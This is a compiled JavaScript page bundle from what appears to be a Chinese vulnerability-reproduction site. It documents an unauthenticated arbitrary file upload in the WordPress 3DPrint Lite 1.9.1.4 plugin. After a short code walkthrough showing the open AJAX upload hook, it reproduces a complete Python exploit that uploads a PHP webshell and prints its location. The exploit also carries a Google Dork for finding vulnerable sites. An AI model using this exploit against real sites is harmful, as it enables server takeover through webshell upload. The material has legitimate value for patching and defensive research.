import{_ as t}from"./plugin-vue_export-helper-c27b6911.js";import{r as s,o as d,c as l,a as i,b as a,d as r,e}from"./app-58e4a7d6.js";const u={},c=e(`<h2 id="漏洞描述" tabindex="-1"><a class="header-anchor" href="#漏洞描述" aria-hidden="true">#</a> 漏洞描述</h2><p>WordPress 3DPrint Lite Version 1.9.1.4 版本 中的 3dprint-lite-functions.php 文件存在文件上传漏洞，攻击者通过构造请求包可以上传任意文件获取服务器权限</p><h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>3DPrint Lite Version 1.9.1.4 版本
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="插件名" tabindex="-1"><a class="header-anchor" href="#插件名" aria-hidden="true">#</a> 插件名</h2><p>3DPrint Lite</p>`,6),p={href:"https://downloads.wordpress.org/plugin/3dprint-lite.1.9.1.4.zip",target:"_blank",rel:"noopener noreferrer"},v=e(`<h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>首先看一下插件注册的接口</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241329738.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>if ( is_admin() ) {
	add_action( &#39;admin_enqueue_scripts&#39;, &#39;p3dlite_enqueue_scripts_backend&#39; );
	add_action( &#39;wp_ajax_p3dlite_handle_upload&#39;, &#39;p3dlite_handle_upload&#39; );
	add_action( &#39;wp_ajax_nopriv_p3dlite_handle_upload&#39;, &#39;p3dlite_handle_upload&#39; );
	include &#39;includes/3dprint-lite-admin.php&#39;;
}
else {
	add_action( &#39;wp_enqueue_scripts&#39;, &#39;p3dlite_enqueue_scripts_frontend&#39; );
	include &#39;includes/3dprint-lite-frontend.php&#39;;
}
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>跟踪 p3dlite_handle_upload 方法 <code>wp-content/plugins/3dprint-lite/includes/3dprint-lite-functions.php</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241331648.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>向下看可以看到一个标准的文件上传代码</p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241331787.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>通过调试可以找到上传路径 <code>/wp-content/uploads/p3d/</code></p><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241330351.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure><p>未授权调用 p3dlite_handle_upload 上传文件</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code># Exploit Title: Wordpress Plugin 3DPrint Lite 1.9.1.4 - Arbitrary File Upload
# Google Dork: inurl:/wp-content/plugins/3dprint-lite/
# Date: 22/09/2021
# Exploit Author: spacehen
# Vendor Homepage: https://wordpress.org/plugins/3dprint-lite/
# Version: &lt;= 1.9.1.4
# Tested on: Ubuntu 20.04.1

import os.path
from os import path
import json
import requests;
import sys

def print_banner():
	print(&quot;3DPrint Lite &lt;= 1.9.1.4 - Arbitrary File Upload&quot;)
	print(&quot;Author -&gt; spacehen (www.github.com/spacehen)&quot;)

def print_usage():
	print(&quot;Usage: python3 exploit.py [target url] [php file]&quot;)
	print(&quot;Ex: python3 exploit.py https://example.com ./shell.php&quot;)

def vuln_check(uri):
	response = requests.get(uri)
	raw = response.text
	if (&quot;jsonrpc&quot; in raw):
		return True;
	else:
		return False;

def main():

	print_banner()
	if(len(sys.argv) != 3):
		print_usage();
		sys.exit(1);

	base = sys.argv[1]
	file_path = sys.argv[2]

	ajax_action = &#39;p3dlite_handle_upload&#39;
	admin = &#39;/wp-admin/admin-ajax.php&#39;;

	uri = base + admin + &#39;?action=&#39; + ajax_action ;
	check = vuln_check(uri);

	if(check == False):
		print(&quot;(*) Target not vulnerable!&quot;);
		sys.exit(1)

	if( path.isfile(file_path) == False):
		print(&quot;(*) Invalid file!&quot;)
		sys.exit(1)

	files = {&#39;file&#39; : open(file_path)}
	print(&quot;Uploading Shell...&quot;);
	response = requests.post(uri, files=files)
	file_name = path.basename(file_path)
	if(file_name in response.text):
		print(&quot;Shell Uploaded!&quot;)
		if(base[-1] != &#39;/&#39;):
			base += &#39;/&#39;
		print(base + &quot;wp-content/uploads/p3d/&quot; + file_name);
	else:
		print(&quot;Shell Upload Failed&quot;)
		sys.exit(1)

main();        
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><figure><img src="https://cb86160.webp.li/makabaka-r1-photo/202205241331913.png" alt="" tabindex="0" loading="lazy"><figcaption></figcaption></figure>`,13);function o(m,b){const n=s("ExternalLinkIcon");return d(),l("div",null,[c,i("p",null,[i("a",p,[a("https://downloads.wordpress.org/plugin/3dprint-lite.1.9.1.4.zip"),r(n)])]),v])}const g=t(u,[["render",o],["__file","WordPress 3DPrint Lite 3dprint-lite-functions.php 任意文件上传漏洞.html.vue"]]);export{g as default};
